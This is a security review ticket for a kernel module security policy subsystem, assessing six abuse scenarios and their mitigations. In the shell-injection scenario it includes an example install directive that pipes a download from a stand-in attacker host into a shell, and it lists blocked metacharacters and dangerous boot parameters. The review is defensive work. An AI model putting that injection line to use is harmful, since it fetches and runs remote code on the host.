# T-01667: Security Policy Security Review

## Sub-Epic
Kernel Module Management / Security Policy

## Objective
Perform a rigorous security review of the Kernel Module Management Security Policy subsystem (`KernelModuleSecurityPolicy`), checking input validation, injection resistance, resource limits, PEP gating, and abuse vectors SP-A1 through SP-A6.

## 1. Threat Model & Abuse Scenarios Review

### Scenario SP-A1: Module Name Normalization & Evasion
- **Threat**: Attackers or rogue agents attempt to bypass prohibited module lists by varying character casing or substituting hyphens for underscores (e.g., `cram-fs` vs `cramfs`, `DCCP` vs `dccp`).
- **Mitigation**:
  - `validate_module_name` enforces strict `^[a-zA-Z0-9_]+$`. Hyphens and whitespace are rejected unconditionally.
  - Prohibited module comparisons use `.eq_ignore_ascii_case()` across both `evaluate_rule` and `evaluate_autoload`.
- **Finding**: Passed. No case or delimiter bypass possible.

### Scenario SP-A2: Install Command & Shell Metacharacter Injection
- **Threat**: Ingesting or configuring an `install` directive containing shell injection (e.g., `install usb_storage /bin/true; curl attacker.com | sh`).
- **Mitigation**:
  - `SP-KM4`: Install command binary must be in `allowed_install_commands` (`/bin/true`, `/bin/false`, `/usr/bin/true`, `/usr/bin/false`).
  - Command string is checked for prohibited shell metacharacters: `;`, `&`, `|`, `` ` ``, `$`, `\n`, `\r`, and `..` directory traversal.
- **Finding**: Passed. Shell execution vectors are strictly neutralized.

### Scenario SP-A3: Core Kernel Subsystem Self-DoS
- **Threat**: Accidental or malicious blacklisting or disabling of foundational drivers (`ext4`, `overlay`, `dm_mod`, `crypto`), causing boot failure or container runtime crashes.
- **Mitigation**:
  - `SP-KM3`: `protected_modules` cannot be blacklisted or disabled via install `/bin/false` or `/bin/true`.
  - Violations are fatal and cannot be bypassed even in Permissive mode.
- **Finding**: Passed. Protected kernel subsystems are preserved.

### Scenario SP-A4: Resource Exhaustion via Giant Policy File
- **Threat**: Malicious actor provides a multi-gigabyte policy configuration to cause OOM or DoS during policy parsing.
- **Mitigation**:
  - `from_file` checks `file.metadata().len()` against `MAX_POLICY_FILE_BYTES` (64 KiB) prior to reading.
  - Reader is bounded by `.take(MAX_POLICY_FILE_BYTES + 1)`.
- **Finding**: Passed. File size is strictly capped.

### Scenario SP-A5: Parameter Manipulation & Kernel Panics
- **Threat**: Passing dangerous boot/module options (e.g. `panic=1`, `init=/bin/sh`, or 100 KiB buffer overflow payloads).
- **Mitigation**:
  - `SP-KM5`: Disallows parameter keys in `disallowed_parameter_keys` (`panic`, `init`, `rdinit`).
  - Limits parameter value length to `max_parameter_value_len` (default: 1024 bytes).
  - Checks for illegal characters and shell metacharacters.
- **Finding**: Passed. Parameter vectors are sanitized.

### Scenario SP-A6: PEP Gating & Audit Traceability
- **Threat**: Unrecorded state changes or unauthenticated policy evaluations.
- **Mitigation**:
  - CLI: `aiosh mod policy` invokes `classify_and_emit` recording rule id, actor, verdict, and violation count.
  - MCP: `aios.kernel_module.policy` runs through `dispatch::recorded_call` appending to SHA-256 hash-chained SQLite WAL audit ring.
- **Finding**: Passed. Full audit compliance per ADR-0035.

## 2. Review Conclusion
No known policy bypasses or architectural vulnerabilities exist. Subsystem is approved for hardening (T-01668).
